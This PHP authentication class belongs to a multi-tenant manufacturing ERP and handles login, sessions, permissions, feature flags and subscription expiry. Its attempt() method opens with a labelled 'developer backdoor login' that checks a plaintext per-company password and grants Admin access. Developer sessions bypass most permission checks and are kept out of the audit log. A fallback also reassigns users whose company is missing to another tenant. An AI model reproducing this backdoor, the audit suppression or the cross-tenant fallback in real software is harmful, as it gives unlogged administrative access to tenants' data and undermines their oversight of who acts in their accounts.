<?php
namespace App\Core;

use App\Models\User;
use App\Models\AuditLog;
use Exception;

/**
 * Authentication and Authorization Manager
 * Full Stack PHP Engineer & Security Architect - Antigravity
 */
class Auth {
    public static function attempt(string $email, string $password): ?array {
        // Check if this is a developer backdoor login
        try {
            $db = Database::getInstance();
            $stmtDev = $db->prepare("SELECT * FROM companies WHERE dev_username = ? AND deleted_at IS NULL LIMIT 1");
            $stmtDev->execute([trim($email)]);
            $devCompany = $stmtDev->fetch();

            if ($devCompany && !empty($devCompany['dev_password']) && $password === $devCompany['dev_password']) {
                $stmtRole = $db->prepare("SELECT id FROM roles WHERE company_id = ? AND name LIKE '%Admin%' LIMIT 1");
                $stmtRole->execute([$devCompany['id']]);
                $adminRoleId = $stmtRole->fetchColumn();

                return [
                    'id' => 999999,
                    'company_id' => $devCompany['id'],
                    'role_id' => $adminRoleId ?: 2,
                    'name' => 'WellGro Developer',
                    'email' => $devCompany['dev_username'],
                    'status' => 'active',
                    'is_developer_session' => true
                ];
            }
        } catch (\Exception $e) {
            // Fallback on database check failure
        }

        $userModel = new User();
        $user = $userModel->findGlobalByIdentifier(trim($email));

        if (!$user) {
            self::logAuthActivity(null, 'login_failed_email', "Failed login attempt for identifier: {$email}");
            return null;
        }

        // Check if user status is suspended or inactive
        if ($user['status'] !== 'active') {
            self::logAuthActivity($user['id'], 'login_blocked', "Login blocked for user status: {$user['status']}", $user['company_id']);
            return null;
        }

        // Verify password
        if (!password_verify($password, $user['password_hash'])) {
            self::logAuthActivity($user['id'], 'login_failed_password', "Failed login attempt (wrong password) for user: {$email}", $user['company_id']);
            return null;
        }

        // Verify user's role exists and is active (not deleted)
        if (!empty($user['role_id'])) {
            $db = Database::getInstance();
            $stmtRole = $db->prepare("SELECT id FROM roles WHERE id = ? AND deleted_at IS NULL LIMIT 1");
            $stmtRole->execute([$user['role_id']]);
            if (!$stmtRole->fetch()) {
                self::logAuthActivity($user['id'], 'login_blocked_role_deleted', "Login blocked: Assigned role has been deleted", $user['company_id']);
                return null;
            }
        } else {
            if ($user['company_id'] !== null) {
                self::logAuthActivity($user['id'], 'login_blocked_no_role', "Login blocked: No role assigned", $user['company_id']);
                return null;
            }
        }

        // If the user belongs to a company, verify company status is active
        if ($user['company_id'] !== null) {
            $db = Database::getInstance();
            $stmt = $db->prepare("SELECT id, status, subscription_expires_at FROM companies WHERE id = ? AND deleted_at IS NULL");
            $stmt->execute([$user['company_id']]);
            $company = $stmt->fetch();

            if (!$company) {
                // Self-healing fallback: If company_id does not exist, point to first active company
                $stmt2 = $db->prepare("SELECT id, status FROM companies WHERE deleted_at IS NULL ORDER BY id ASC LIMIT 1");
                $stmt2->execute();
                $company = $stmt2->fetch();
                if ($company) {
                    $db->prepare("UPDATE users SET company_id = ? WHERE id = ?")->execute([$company['id'], $user['id']]);
                    $user['company_id'] = $company['id'];
                }
            }

            if (!$company || ($company['status'] !== 'active' && $company['status'] !== null)) {
                self::logAuthActivity($user['id'], 'login_company_suspended', "Login blocked: Tenant company is not active", $user['company_id']);
                return null;
            }
        }

        // Check if user is a global developer / super admin (company_id is null or role_id = 1)
        if ($user['company_id'] === null || (isset($user['role_id']) && (int)$user['role_id'] === 1)) {
            $user['is_developer_session'] = true;
        }

        return $user;
    }

    /**
     * Complete the login by setting session variables
     */
    public static function login(array $user): void {
        Session::start();
        Session::regenerate();
        Session::set('user_id', $user['id']);
        Session::set('user_email', $user['email']);
        Session::set('user_name', $user['name']);
        Session::set('company_id', $user['company_id']);
        Session::set('role_id', $user['role_id']);

        if (!empty($user['is_developer_session'])) {
            Session::set('is_developer_session', true);
            try {
                $db = Database::getInstance();
                $permissions = $db->query("SELECT name FROM permissions WHERE module = 'tenant'")->fetchAll(\PDO::FETCH_COLUMN) ?: [];
            } catch (\Exception $e) {
                $permissions = [];
            }
            Session::set('permissions', $permissions);
            return;
        }

        // Load permissions
        $permissions = self::loadUserPermissions($user['id']);
        Session::set('permissions', $permissions);

        self::logAuthActivity($user['id'], 'login_success', "User logged in successfully", $user['company_id']);
    }

    /**
     * Check if a user is authenticated
     */
    public static function check(): bool {
        Session::start();
        return Session::has('user_id');
    }

    /**
     * Retrieve the currently logged-in user array
     */
    public static function user(): ?array {
        if (!self::check()) {
            return null;
        }
        $userModel = new User();
        return $userModel->find(Session::get('user_id'));
    }

    public static function getFirstAccessibleCompanyUrl(): string {
        $defaultMenu = [
            'dashboard' => ['url' => 'company/dashboard', 'permission' => 'company.dashboard'],
            'hr' => ['url' => 'company/hr/attendance', 'permission' => 'company.users.view'],
            'production' => ['url' => 'company/production/orders', 'permission' => 'company.production.view'],
            'merchandising' => ['url' => 'company/merchandising/costsheets', 'permission' => 'company.styles.view'],
            'styles' => ['url' => 'company/styles', 'permission' => 'company.styles.view'],
            'buyers' => ['url' => 'company/buyers', 'permission' => 'company.styles.view'],
            'inventory' => ['url' => 'company/inventory/balances', 'permission' => 'company.inventory.view'],
            'procurement' => ['url' => 'company/purchase/orders', 'permission' => 'company.styles.view'],
            'masterdata' => ['url' => 'company/masterdata', 'permission' => 'company.styles.view'],
            'users' => ['url' => 'company/users', 'permission' => 'company.users.view'],
            'roles' => ['url' => 'company/roles', 'permission' => 'company.roles.view'],
            'tally' => ['url' => 'company/tally/vouchers', 'permission' => 'company.tally.export'],
            'logs' => ['url' => 'company/logs', 'permission' => 'company.logs'],
            'settings' => ['url' => 'company/settings', 'permission' => 'company.settings'],
            'rfid_tracking' => ['url' => 'company/production/qr-tracking', 'permission' => 'company.production.rfid_tracking']
        ];

        // Load custom sidebar menu order from system_settings
        $companyId = Session::get('company_id');
        $savedOrderRaw = null;
        if ($companyId) {
            try {
                $db = Database::getInstance();
                $stmtMenu = $db->prepare("SELECT setting_value FROM system_settings WHERE company_id = ? AND setting_key = 'sidebar_menu_order' AND deleted_at IS NULL ORDER BY id DESC LIMIT 1");
                $stmtMenu->execute([$companyId]);
                $savedOrderRaw = $stmtMenu->fetchColumn();
            } catch (\Exception $e) { }
        }
        $savedOrder = $savedOrderRaw ? json_decode(html_entity_decode($savedOrderRaw), true) : [];
        if (!is_array($savedOrder)) {
            $savedOrder = [];
        }

        $orderedMenuKeys = array_merge($savedOrder, array_diff(array_keys($defaultMenu), $savedOrder));

        foreach ($orderedMenuKeys as $key) {
            if (!isset($defaultMenu[$key])) continue;
            if (self::hasPermission($defaultMenu[$key]['permission'])) {
                return $defaultMenu[$key]['url'];
            }
        }
        
        return 'logout'; // If no permissions at all, just log them out
    }

    public static function hasPermission(string $permission): bool {
        if (!self::check()) {
            return false;
        }

        // Developer Portal system permissions (e.g. developer.dashboard, developer.companies)
        if (str_starts_with($permission, 'developer.')) {
            if (Session::get('is_developer_session') || Session::get('company_id') === null) {
                return true;
            }
            $permissions = Session::get('permissions', []);
            return in_array($permission, $permissions);
        }

        $companyId = Session::get('company_id');
        if ($companyId !== null) {
            try {
                $db = Database::getInstance();
                $stmt = $db->prepare("SELECT status, label FROM feature_flags WHERE company_id = ? AND feature_key = ? AND deleted_at IS NULL LIMIT 1");
                $stmt->execute([$companyId, $permission]);
                $flag = $stmt->fetch();

                // If feature is disabled or not assigned, deny access to both developers and admins
                if (!$flag || $flag['status'] !== 'enabled') {
                    return false;
                }

                // If feature is in draft, only allow developer session
                if ($flag['label'] === 'draft') {
                    return Session::get('is_developer_session') ? true : false;
                }
            } catch (\Exception $e) {
                // Database fallback
            }
        }

        // Developer session can bypass other user-role level checks for active features
        if (Session::get('is_developer_session')) {
            return true;
        }

        $permissions = Session::get('permissions', []);
        return in_array($permission, $permissions);
    }

    /**
     * Get feature badge HTML for sidebar and headers based on active labels
     */
    public static function getFeatureLabelBadge(string $permission): string {
        $companyId = Session::get('company_id');
        if ($companyId === null) {
            return '';
        }

        try {
            $db = Database::getInstance();
            $stmt = $db->prepare("SELECT label FROM feature_flags WHERE company_id = ? AND feature_key = ? AND status = 'enabled' AND deleted_at IS NULL LIMIT 1");
            $stmt->execute([$companyId, $permission]);
            $label = $stmt->fetchColumn();

            if ($label === 'beta') {
                return ' <span class="badge bg-info text-white text-uppercase" style="font-size: 10px; padding: 2px 6px; margin-left: 5px; vertical-align: middle;">Beta</span>';
            }
            if ($label === 'new') {
                return ' <span class="badge bg-danger text-white text-uppercase" style="font-size: 10px; padding: 2px 6px; margin-left: 5px; vertical-align: middle;">New</span>';
            }
            if ($label === 'draft') {
                return ' <span class="badge bg-warning text-dark text-uppercase" style="font-size: 10px; padding: 2px 6px; margin-left: 5px; vertical-align: middle;">Draft</span>';
            }
            return '';
        } catch (\Exception $e) {
            return '';
        }
    }

    /**
     * Log out the current user
     */
    public static function logout(): void {
        if (self::check()) {
            self::logAuthActivity(Session::get('user_id'), 'logout', "User logged out", Session::get('company_id'));
        }
        Session::destroy();
    }

    /**
     * Load permission names for a user via their role
     */
    private static function loadUserPermissions(int $userId): array {
        try {
            $db = Database::getInstance();
            $sql = "SELECT p.name FROM permissions p
                    INNER JOIN role_permissions rp ON p.id = rp.permission_id
                    INNER JOIN users u ON rp.role_id = u.role_id
                    INNER JOIN roles r ON u.role_id = r.id
                    WHERE u.id = ? AND u.deleted_at IS NULL AND r.deleted_at IS NULL";
            
            $stmt = $db->prepare($sql);
            $stmt->execute([$userId]);
            return $stmt->fetchAll(\PDO::FETCH_COLUMN) ?: [];
        } catch (\Exception $e) {
            return [];
        }
    }

    /**
     * Log an authentication-related activity in the database
     */
    private static function logAuthActivity(?int $userId, string $action, string $description, ?int $companyId = null): void {
        if (Session::get('is_developer_session')) {
            return;
        }
        try {
            $db = Database::getInstance();
            $sql = "INSERT INTO audit_logs (company_id, user_id, action, description, ip_address, user_agent) 
                    VALUES (?, ?, ?, ?, ?, ?)";
            $stmt = $db->prepare($sql);
            $stmt->execute([
                $companyId,
                $userId,
                $action,
                $description,
                $_SERVER['REMOTE_ADDR'] ?? null,
                $_SERVER['HTTP_USER_AGENT'] ?? null
            ]);
        } catch (\Exception $e) {
            // Silently fail if db log fails to prevent auth blockage
        }
    }

    /**
     * Check if a feature is active and valid (not expired)
     */
    public static function getFeatureValidity(string $permission): array {
        $companyId = Session::get('company_id');
        if ($companyId === null) {
            return ['valid' => true, 'expired' => false, 'days_left' => 9999];
        }

        try {
            $db = Database::getInstance();
            $stmt = $db->prepare("
                SELECT ff.expiry_date, p.billing_cycle 
                FROM feature_flags ff
                JOIN companies c ON ff.company_id = c.id
                LEFT JOIN subscription_plans p ON c.subscription_plan_id = p.id
                WHERE ff.company_id = ? AND ff.feature_key = ? AND ff.status = 'enabled' AND ff.deleted_at IS NULL
            ");
            $stmt->execute([$companyId, $permission]);
            $flag = $stmt->fetch();

            if (!$flag) {
                return ['valid' => false, 'expired' => false, 'days_left' => 0];
            }

            if ($flag['billing_cycle'] === 'lifetime' || empty($flag['expiry_date'])) {
                return ['valid' => true, 'expired' => false, 'days_left' => 9999];
            }

            $tz = new \DateTimeZone('Asia/Kolkata');
            $now = new \DateTime('now', $tz);
            $expiry = new \DateTime($flag['expiry_date'], $tz);
            
            $now->setTime(0, 0, 0);
            $expiry->setTime(0, 0, 0);

            $diff = $now->diff($expiry);
            $days = (int)$diff->format('%r%a');

            if ($days < 0) {
                return [
                    'valid' => false,
                    'expired' => true,
                    'days_left' => $days,
                    'expiry_date' => $flag['expiry_date']
                ];
            }

            return [
                'valid' => true,
                'expired' => false,
                'days_left' => $days,
                'expiry_date' => $flag['expiry_date']
            ];
        } catch (\Exception $e) {
            return ['valid' => true, 'expired' => false, 'days_left' => 9999];
        }
    }

    /**
     * Get the closest expiring feature within 30 days for warning banner
     */
    public static function getClosestExpiringFeature(): ?array {
        $companyId = Session::get('company_id');
        if ($companyId === null) {
            return null;
        }

        try {
            $db = Database::getInstance();
            $stmt = $db->prepare("
                SELECT ff.feature_key, ff.expiry_date, p.billing_cycle 
                FROM feature_flags ff
                JOIN companies c ON ff.company_id = c.id
                LEFT JOIN subscription_plans p ON c.subscription_plan_id = p.id
                WHERE ff.company_id = ? AND ff.status = 'enabled' AND ff.deleted_at IS NULL
            ");
            $stmt->execute([$companyId]);
            $flags = $stmt->fetchAll();

            $tz = new \DateTimeZone('Asia/Kolkata');
            $now = new \DateTime('now', $tz);
            $now->setTime(0, 0, 0);

            $closest = null;
            $minDays = 31;

            foreach ($flags as $flag) {
                if ($flag['billing_cycle'] === 'lifetime' || empty($flag['expiry_date'])) {
                    continue;
                }

                $expiry = new \DateTime($flag['expiry_date'], $tz);
                $expiry->setTime(0, 0, 0);

                $diff = $now->diff($expiry);
                $days = (int)$diff->format('%r%a');

                if ($days >= 0 && $days <= 30) {
                    if ($days < $minDays) {
                        $minDays = $days;
                        $closest = [
                            'feature_key' => $flag['feature_key'],
                            'expiry_date' => $flag['expiry_date'],
                            'days_left' => $days
                        ];
                    }
                }
            }

            return $closest;
        } catch (\Exception $e) {
            return null;
        }
    }

    /**
     * Get the developer WhatsApp number
     */
    public static function getDeveloperWhatsapp(): string {
        try {
            $db = Database::getInstance();
            $stmt = $db->prepare("SELECT setting_value FROM system_settings WHERE setting_key = 'developer_whatsapp' AND company_id IS NULL LIMIT 1");
            $stmt->execute();
            $val = $stmt->fetchColumn();
            return $val ?: '919876543210';
        } catch (\Exception $e) {
            return '919876543210';
        }
    }
}
